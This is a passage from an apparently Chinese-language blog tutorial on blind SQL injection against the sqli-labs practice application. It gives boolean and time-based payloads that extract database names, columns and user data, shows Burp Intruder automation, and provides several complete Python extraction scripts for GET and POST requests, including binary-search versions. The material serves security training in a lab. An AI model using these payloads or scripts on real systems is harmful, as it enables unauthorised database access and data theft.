table_name=&#x27;users&#x27; limit 0,1),1,1))&gt;100 --+</span><br><span class="line"></span><br><span class="line">//判断第一个字段的第二个字符的ascii</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),2,1))&gt;100 --+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...........</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">由此可判断出users表中存在 id、username、password 字段</span><br></pre></td></tr></table></figure><ol start="5"><li>爆字段中的数据</li></ol><ul><li>猜字段中数据的长度</li><li>猜字段数据的每个字符ascii码 得字符</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">我们知道了users中有三个字段 id 、username 、password，我们现在爆出每个字段的数据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1: 判断数据的长度</span><br><span class="line"></span><br><span class="line">// 判断id字段的第一个数据的长度</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select id from users limit 0,1))&gt;5 --+</span><br><span class="line"></span><br><span class="line">// 判断id字段的第二个数据的长度</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select id from users limit 1,1))&gt;5 --+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2：判断数据的ascii值</span><br><span class="line"></span><br><span class="line">// 判断id字段的第一行数据的第一个字符的ascii值</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select id from users limit  0,1),1,1))&gt;100 --+</span><br><span class="line"></span><br><span class="line">// 判断id字段的第二行数据的第二个字符的ascii值</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select id from users limit 0,1),2,1))&gt;100 --+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...........</span><br></pre></td></tr></table></figure><p>一般布尔盲注，手工去注入过于繁琐，不建议手工注入，可以借助<br><a name="cKtbz"></a></p><h4 id="利用burp实现布尔盲注"><a href="#利用burp实现布尔盲注" class="headerlink" title="利用burp实现布尔盲注"></a>利用burp实现布尔盲注</h4><p>抓取访问的数据包发到intruder模块，标记好两个参数，选择集束炸弹模式<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233725789.png" alt="image-20230724233725789"></p><p>第一个变量的负载我们选择数值模式，我们判断过字符长度为8，便选择从1到8，步长为1<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233737217.png" alt="image-20230724233737217"></p><p>第二个负载我们选择burp自带的字母和数字，以及手动添加常见数据库中的可打印字符，如 _  ,  +  -  <br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233759446.png" alt="image-20230724233759446"></p><p>然后开始攻击，通过长度判断，正确位置对应字符是什么，然后排列得到当前数据库为’security’<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233810961.png" alt="image-20230724233810961"></p><p>以此类推，同样的操作用来爆库，爆字段，爆数据<br><a name="D7Wbs"></a></p><h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><p>也叫延时注入。通过观察页面，既没有回显数据库内容，又没有报错信息也没有布尔类型状态，那么我们可以考虑用“绝招”–延时注入。延时注入就是将页面的时间线作为判断依据，一点一点注入出数据库的信息。我们以第9关为例，在id&#x3D;1后面加单引号或者双引号，页面不会发生任何改变，所以我们考虑绝招延时注入。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233825498.png" alt="image-20230724233825498"><br />1. 延时注入<br />?id&#x3D;1’ and sleep(5) –+    <br />如图所示，观察请求的时间线，大概在5秒以上，说明构造的sleep(5) 语句起作用，可以把这个时间线作为sql 注入的判断依据。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233837113.png" alt="image-20230724233837113"><br />2. 获取数据库名字<br />延时注入与布尔盲注类似，构造方法如下，提交参数<br />?id&#x3D;1’ and if(ascii(substr(database(),1,1))&#x3D; 115,sleep(5),0) –+<br />if(expr1,expr2,expr3)       如果expr1的值为true，则返回expr2的值，如果expr1的值为false，则返回expr3的值。 传送门-》<a href="https://blog.csdn.net/qq_44159028/article/details/114327303?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161646302616780261917189%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=161646302616780261917189&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v1~rank_blog_v1-1-114327303.pc_v1_rank_blog_v1&utm_term=mysql">mysql基础学习</a><br />代码的含义就是如果数据库名字的第一个字符的acsii值为115，则进行延时，否则返回0即什么都不返回。<br />页面显示延时5 秒，说明数据库名字第一个字母的ASCII 值是115，也就是字母s。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233849341.png" alt="image-20230724233849341"><br />3. 数据库名字第二个字母的判断，<br />?id&#x3D;1’ and if(ascii(substr(database(),2,1))&#x3D; 101,sleep(5),0) –+<br />与盲注类似，后面就是猜数，这就是延时注入<br><a name="s6Xm5"></a></p><h4 id="利用burp实现时间盲注"><a href="#利用burp实现时间盲注" class="headerlink" title="利用burp实现时间盲注"></a>利用burp实现时间盲注</h4><p>我们把访问的数据包发到intruder模块，然后标记好两个参数，前几步的方式和布尔盲注都一样，不再赘述，我们直接来看时间盲注结果的筛选，<br />如图所示：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233900979.png" alt="image-20230724233900979"></p><p>然后我们根据序号排列组合得到当前库名为：security<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233913127.png" alt="image-20230724233913127"></p><p><a name="kVlFz"></a></p><h3 id="盲注exp的编写"><a href="#盲注exp的编写" class="headerlink" title="盲注exp的编写"></a>盲注exp的编写</h3><p><a name="TnIoo"></a></p><h4 id="GET型布尔盲注脚本编写"><a href="#GET型布尔盲注脚本编写" class="headerlink" title="GET型布尔盲注脚本编写"></a>GET型布尔盲注脚本编写</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_info</span>(<span class="params">sql</span>):</span><br><span class="line">    result, IsTrue = <span class="string">&quot;&quot;</span>, <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10000</span>):</span><br><span class="line">        <span class="keyword">if</span> (IsTrue):</span><br><span class="line">            IsTrue = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">128</span>):</span><br><span class="line">                res = requests.get(<span class="string">f&quot;http://www.sqli.com/Less-8/?id=1&#x27; and ascii(substr((<span class="subst">&#123;sql&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span> -- +&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> res.text):</span><br><span class="line">                    IsTrue = <span class="literal">True</span></span><br><span class="line">                    result += <span class="built_in">chr</span>(j)</span><br><span class="line">                    <span class="built_in">print</span>(result)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;数据长度为<span class="subst">&#123;i - <span class="number">2</span>&#125;</span>,脚本运行结束&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sql1 = <span class="string">&quot;select database()&quot;</span></span><br><span class="line">get_info(sql1)</span><br></pre></td></tr></table></figure><p>考虑到有时候可能会出现网络问题，我们要考虑超时重发的问题，我们需要了解以下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">s = requests.Session()</span><br><span class="line">s.mount(<span class="string">&#x27;http://&#x27;</span>, requests.adapters.HTTPAdapter(max_retries=<span class="number">3</span>))</span><br><span class="line">s.mount(<span class="string">&#x27;https://&#x27;</span>, requests.adapters.HTTPAdapter(max_retries=<span class="number">3</span>))</span><br><span class="line">time1 = time.time()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    s.get(<span class="string">&quot;https://www.google.com&quot;</span>, timeout=<span class="number">3</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;耗时<span class="subst">&#123;time.time() - time1&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>我们执行代码会发现，约9秒过后，便会抛出超时输出信息，但是正常超时大约是二十多秒左右，便是简易的超时重发模块，我们只需对我们刚才布尔盲注的代码稍加改进即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = requests.Session()</span><br><span class="line">s.mount(<span class="string">&#x27;http://&#x27;</span>, requests.adapters.HTTPAdapter(max_retries=<span class="number">3</span>))</span><br><span class="line">s.mount(<span class="string">&#x27;https://&#x27;</span>, requests.adapters.HTTPAdapter(max_retries=<span class="number">3</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_dbInfo</span>(<span class="params">sql</span>):</span><br><span class="line">    res,IsTrue = <span class="string">&#x27;&#x27;</span>,<span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">        <span class="keyword">if</span> (IsTrue):</span><br><span class="line">             IsTrue = <span class="literal">False</span></span><br><span class="line">             <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">                 <span class="keyword">try</span>:</span><br><span class="line">                     recive = s.get(<span class="string">&quot;http://www.sqli.com/Less-8/?id=1&#x27; and ascii(substr((&#123;0&#125;),&#123;1&#125;,1))=&#123;2&#125; -- +&quot;</span>.<span class="built_in">format</span>(sql,i,j),timeout=<span class="number">3</span>)</span><br><span class="line">                 <span class="keyword">except</span>:</span><br><span class="line">                     exit(<span class="string">&quot;网络错误，目前爆破到第&#123;&#125;位&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">                 <span class="keyword">if</span> (<span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> recive.text):</span><br><span class="line">                     IsTrue = <span class="literal">True</span></span><br><span class="line">                     res += <span class="built_in">chr</span>(j)</span><br><span class="line">                     <span class="built_in">print</span>(res)</span><br><span class="line">                     <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;数据长度为<span class="subst">&#123;i - <span class="number">2</span>&#125;</span>,脚本运行结束&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">sql1 = <span class="string">&#x27;select database()&#x27;</span></span><br><span class="line">get_dbInfo(sql1)</span><br></pre></td></tr></table></figure><p><a name="SPGU5"></a></p><h4 id="GET型布尔盲注脚本-二分"><a href="#GET型布尔盲注脚本-二分" class="headerlink" title="GET型布尔盲注脚本(二分)"></a>GET型布尔盲注脚本(二分)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = requests.Session()</span><br><span class="line">s.mount(<span class="string">&#x27;http://&#x27;</span>, requests.adapters.HTTPAdapter(max_retries=<span class="number">3</span>))</span><br><span class="line">s.mount(<span class="string">&#x27;https://&#x27;</span>, requests.adapters.HTTPAdapter(max_retries=<span class="number">3</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_dbInfo</span>(<span class="params">sql</span>):</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">        head = <span class="number">32</span></span><br><span class="line">        tail = <span class="number">127</span></span><br><span class="line">        mid = (head+tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                recive = s.get(<span class="string">&quot;http://www.sqli.com/Less-8/?id=1&#x27; and ascii(substr((&#123;0&#125;),&#123;1&#125;,1))&gt;&#123;2&#125; -- +&quot;</span>.<span class="built_in">format</span>(sql,i,mid),timeout=<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                exit(<span class="string">&quot;网络错误，目前爆破到第&#123;&#125;位&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> recive.text):</span><br><span class="line">                head = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tail = mid</span><br><span class="line">            mid = (head+tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        res = res + <span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>(mid) == <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span>*<span class="number">20</span>,<span class="string">&#x27;爆破成功&#x27;</span>,<span class="string">&#x27;-&#x27;</span>*<span class="number">20</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">sql1 = <span class="string">&#x27;database()&#x27;</span></span><br><span class="line">get_dbInfo(sql1)</span><br></pre></td></tr></table></figure><p><a name="SLHYw"></a></p><h4 id="GET型时间盲注脚本编写"><a href="#GET型时间盲注脚本编写" class="headerlink" title="GET型时间盲注脚本编写"></a>GET型时间盲注脚本编写</h4><p>时间盲注和布尔盲注的脚本大同小异，我们只需要了解三个来获取响应时间的方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">res = requests.get(<span class="string">&quot;http://www.baidu.com&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.elapsed)  <span class="comment"># 时:分:秒</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.elapsed.total_seconds())  <span class="comment"># 秒数</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.elapsed.microseconds)  <span class="comment"># 微秒数</span></span><br></pre></td></tr></table></figure><p>在执行语句前，我们可以设计一个简单的测试模型：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = requests.Session()</span><br><span class="line">sql = <span class="string">&quot;select database()&quot;</span></span><br><span class="line">res = s.get(<span class="string">f&quot;http://www.sqli.com/Less-9/?id=1&#x27; and if(ascii(substr((<span class="subst">&#123;sql&#125;</span>),<span class="subst">&#123;<span class="number">1</span>&#125;</span>,1))=115, sleep(3),1) -- +&quot;</span>)</span><br><span class="line"><span class="keyword">if</span>(res.elapsed.total_seconds() &gt; <span class="number">3</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;success&#x27;</span>)</span><br></pre></td></tr></table></figure><p>如果正常输出则说明测试成功，接下来编写脚本：<br />注意：超时重发时间设置稍微长一点便于筛选</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = requests.Session()</span><br><span class="line">s.mount(<span class="string">&#x27;http://&#x27;</span>, requests.adapters.HTTPAdapter(max_retries=<span class="number">3</span>))</span><br><span class="line">s.mount(<span class="string">&#x27;https://&#x27;</span>, requests.adapters.HTTPAdapter(max_retries=<span class="number">3</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_dbInfo</span>(<span class="params">sql</span>):</span><br><span class="line">    res,IsTrue = <span class="string">&#x27;&#x27;</span>,<span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">       <span class="keyword">if</span> (IsTrue): </span><br><span class="line">            IsTrue = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    recive = s.get(<span class="string">&quot;http://www.sqli.com/Less-9/?id=1&#x27; and if((ascii(substr((&#123;0&#125;),&#123;1&#125;,1))=&#123;2&#125;),sleep(3),1) -- +&quot;</span>.<span class="built_in">format</span>(sql,i,j),timeout=<span class="number">10</span>)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    exit(<span class="string">&quot;网络错误，目前爆破到第&#123;&#125;位&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">                <span class="keyword">if</span> (recive.elapsed.total_seconds()) &gt; <span class="number">3</span>:</span><br><span class="line">                    IsTrue = <span class="literal">True</span></span><br><span class="line">                    res += <span class="built_in">chr</span>(j)</span><br><span class="line">                    <span class="built_in">print</span>(res)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span>*<span class="number">20</span>,<span class="string">&#x27;爆破完成&#x27;</span>,<span class="string">&#x27;-&#x27;</span>*<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">sql1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">get_dbInfo(sql1)</span><br></pre></td></tr></table></figure><p><a name="mZpLO"></a></p><h4 id="POST型布尔盲注脚本编写"><a href="#POST型布尔盲注脚本编写" class="headerlink" title="POST型布尔盲注脚本编写"></a>POST型布尔盲注脚本编写</h4><p>post型对比get型区别不大，主要是requests中post方法的参数提供</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url1 = <span class="string">&#x27;www.baidu.com&#x27;</span></span><br><span class="line">data1 = &#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>&#125;</span><br><span class="line">requests.post(url=url1,data=data1)</span><br><span class="line"><span class="comment"># post方法传递数据主要是键值对的形式</span></span><br></pre></td></tr></table></figure><p>我们对get型的进行改编，以15关为例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = requests.Session()</span><br><span class="line">s.mount(<span class="string">&#x27;http://&#x27;</span>, requests.adapters.HTTPAdapter(max_retries=<span class="number">3</span>))</span><br><span class="line">s.mount(<span class="string">&#x27;https://&#x27;</span>, requests.adapters.HTTPAdapter(max_retries=<span class="number">3</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_dbInfo</span>(<span class="params">sql</span>):</span><br><span class="line">    res,IsTrue = <span class="string">&#x27;&#x27;</span>,<span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">       <span class="keyword">if</span> (IsTrue): </span><br><span class="line">            IsTrue = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">                datan=&#123;<span class="string">&quot;passwd&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;uname&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">                datan[<span class="string">&#x27;uname&#x27;</span>]=<span class="string">&quot;admin&#x27; and ascii(substr((&#123;0&#125;),&#123;1&#125;,1))=&#123;2&#125; #&quot;</span>.<span class="built_in">format</span>(sql,i,j)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    recive = s.post(url=<span class="string">&quot;http://www.sqli.com/Less-15/&quot;</span>,data=datan,timeout=<span class="number">3</span>)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    exit(<span class="string">&quot;网络错误，目前爆破到第&#123;&#125;位&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&#x27;../images/flag.jpg&#x27;</span> <span class="keyword">in</span> recive.text):</span><br><span class="line">                    IsTrue = <span class="literal">True</span></span><br><span class="line">                    res += <span class="built_in">chr</span>(j)</span><br><span class="line">                    <span class="built_in">print</span>(res)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span>*<span class="number">20</span>,<span class="string">&#x27;爆破完成&#x27;</span>,<span class="string">&#x27;-&#x27;</span>*<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">sql1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">get_dbInfo(sql1)</span><br></pre></td></tr></table></figure><p><a name="jDFVs"></a></p><h4 id="POST型布尔盲注脚本-二分"><a href="#POST型布尔盲注脚本-二分" class="headerlink" title="POST型布尔盲注脚本(二分)"></a>POST型布尔盲注脚本(二分)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = requests.Session()</span><br><span class="line">s.mount(<span class="string">&#x27;http://&#x27;</span>, requests.adapters.HTTPAdapter(max_retries=<span class="number">3</span>))</span><br><span class="line">s.mount(<span class="string">&#x27;https://&#x27;</span>, requests.adapters.HTTPAdapter(max_retries=<span class="number">3</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_dbInfo</span>(<span class="params">sql</span>):</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">        head = <span class="number">32</span></span><br><span class="line">        tail = <span class="number">127</span></span><br><span class="line">        mid = (head+tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">            datan=&#123;<span class="string">&quot;passwd&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;uname&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">            datan[<span class="string">&#x27;uname&#x27;</span>]=<span class="string">&quot;admin&#x27; and ascii(substr((&#123;0&#125;),&#123;1&#125;,1))&gt;&#123;2&#125; #&quot;</span>.<span class="built_in">format</span>(sql,i,mid)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                recive = s.post(url=<span class="string">&quot;http://www.sqli.com/Less-15/&quot;</span>,data=datan,timeout=<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                exit(<span class="string">&quot;网络错误，目前爆破到第&#123;&#125;位&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&#x27;../images/flag.jpg&#x27;</span> <span class="keyword">in</span> recive.text):</span><br><span class="line">                head = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tail = mid</span><br><span class="line">            mid = (head+tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        res = res + <span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>(mid) == <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span>*<span class="number">20</span>,<span class="string">&#x27;爆破成功&#x27;</span>,<span class="string">&#x27;-&#x27;</span>*<span class="number">20</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">sql1 = <span class="string">&#x27;version()&#x27;</span></span><br><span class="line">get_dbInfo(sql1)</span><br></pre></td></tr></table></figure><p><a name="FW1Gx"></a></p><h4 id="POST型时间盲注脚本编写"><a href="#POST型时间盲注脚本编写" class="headerlink" 